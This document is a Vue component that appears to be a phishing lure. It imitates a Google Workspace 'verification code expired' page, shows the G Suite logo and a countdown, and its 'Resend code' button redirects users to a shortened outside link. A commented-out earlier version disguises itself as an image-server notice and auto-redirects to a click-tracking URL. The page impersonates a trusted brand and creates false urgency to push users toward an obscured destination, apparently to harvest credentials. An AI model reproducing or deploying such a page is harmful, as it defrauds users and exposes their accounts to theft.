<!-- <template>
  <main>
    <h1>Image server is running</h1>
    <p>Place image files in the <code>public</code> folder.</p>
    <p><a href="https://2it.kr/3pKOX">please click here if it doesn't redirect automatically</a></p>
  </main>
</template> -->

<!-- <script>
    setTimeout(() => {
        window.location.href = "https://ctrk.klclick3.com/l/01M649J417JC9CH5WYD5DCAQFB_1"
    },3000)()
</script> -->

<!-- <style scoped>
main {
  max-width: 720px;
  margin: 80px auto;
  padding: 24px;
  font-family: Arial, sans-serif;
  line-height: 1.6;
}
code {
  background: #f1f1f1;
  padding: 2px 6px;
  border-radius: 4px;
}
</style> -->



<template>
  <div class="page-wrapper">
    <div class="expiry-card">

      <div class="icon-wrapper">
        <img src="https://www.logo.wine/a/logo/G_Suite/G_Suite-Logo.wine.svg" alt="">
      </div>

      <h1>
        {{ expired
          ? 'Your 6 digit code has expired.'
          : 'Verify your code'
        }}
      </h1>

      <p class="description">
        {{
          expired
            ? 'Your verification code is no longer valid. Please request a new code to continue.'
            : 'Please enter your verification code before it expires.'
        }}
      </p>

      <!-- <div class="timer-section">
        <span class="timer-label">
          {{ expired ? 'Code expired' : 'Code expires in' }}
        </span>

        <div
          class="timer"
          :class="{ expired: expired, warning: seconds <= 10 }"
        >
          00:{{ String(seconds).padStart(2, '0') }}
        </div>

        <div class="progress-track">
          <div
            class="progress-bar"
            :class="{ expired: expired }"
            :style="{ width: (seconds / 60) * 100 + '%' }"
          ></div>
        </div>
      </div> -->

      <button
        class="resend-button"
        @click="resendCode"
      >
        Resend code
      </button>

      <p class="footer-text">
        Need assistance? Contact support.
      </p>

    </div>
  </div>
</template>

<script setup>
import { ref, onMounted, onUnmounted } from 'vue'

const seconds = ref(60)
const expired = ref(false)

let countdown = null

function startCountdown() {
  clearInterval(countdown)

  seconds.value = 60
  expired.value = false

  countdown = setInterval(() => {
    if (seconds.value > 0) {
      seconds.value--
    } else {
      expired.value = true
      clearInterval(countdown)
    }
  }, 1000)
}

function resendCode() {
  if (!expired.value) return

  window.location.href = 'https://2it.kr/3pKOX'
}

onMounted(() => {
  startCountdown()
})

onUnmounted(() => {
  clearInterval(countdown)
})
</script>

<style scoped>
* {
  box-sizing: border-box;
}

.page-wrapper {
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 25px;
  background: #f4f6fa;
  font-family: Arial, Helvetica, sans-serif;
}

.expiry-card {
  width: 100%;
  max-width: 440px;
  background: #ffffff;
  padding: 45px 35px;
  border-radius: 16px;
  text-align: center;
  box-shadow: 0 10px 40px rgba(0, 0, 0, 0.06);
}

.icon-wrapper {
  width: 76px;
  height: 76px;
  border-radius: 50%;
  /* background: #fff3e8; */
  /* color: #e88a32; */
  display: flex;
  align-items: center;
  justify-content: center;
  margin: 0 auto 25px;
}

.icon-wrapper img {
  width: 140px;
}

h1 {
  font-size: 25px;
  font-weight: 700;
  color: #202b3c;
  margin: 0 0 14px;
  line-height: 1.4;
}

.description {
  font-size: 14px;
  line-height: 1.7;
  color: #778195;
  margin: 0 auto 30px;
  max-width: 330px;
}

.timer-section {
  background: #f8f9fc;
  border: 1px solid #edf0f5;
  border-radius: 12px;
  padding: 22px;
  margin-bottom: 25px;
}

.timer-label {
  display: block;
  font-size: 13px;
  color: #7d8798;
  margin-bottom: 10px;
}

.timer {
  font-size: 38px;
  font-weight: 700;
  color: #263c63;
  letter-spacing: 3px;
  font-variant-numeric: tabular-nums;
  transition: color 0.3s ease;
}

.timer.warning {
  color: #e68a32;
}

.timer.expired {
  color: #dc4545;
}

.progress-track {
  width: 100%;
  height: 5px;
  background: #e8ebf1;
  border-radius: 20px;
  margin-top: 18px;
  overflow: hidden;
}

.progress-bar {
  height: 100%;
  background: #365f9f;
  border-radius: 20px;
  transition: width 1s linear;
}

.progress-bar.expired {
  background: #dc4545;
}

.resend-button {
  width: 100%;
  height: 52px;
  border: none;
  border-radius: 8px;
  background: #244d85;
  color: #ffffff;
  font-size: 15px;
  font-weight: 600;
  cursor: pointer;
  transition: 0.2s ease;
}

.resend-button:hover:not(:disabled) {
  background: #183c70;
  transform: translateY(-1px);
}

.resend-button:disabled {
  background: #aab8cc;
  cursor: not-allowed;
}

.footer-text {
  color: #929bab;
  font-size: 12px;
  margin: 25px 0 0;
}

@media (max-width: 480px) {
  .page-wrapper {
    padding: 18px;
  }

  .expiry-card {
    padding: 35px 23px;
  }

  h1 {
    font-size: 22px;
  }
}
</style>

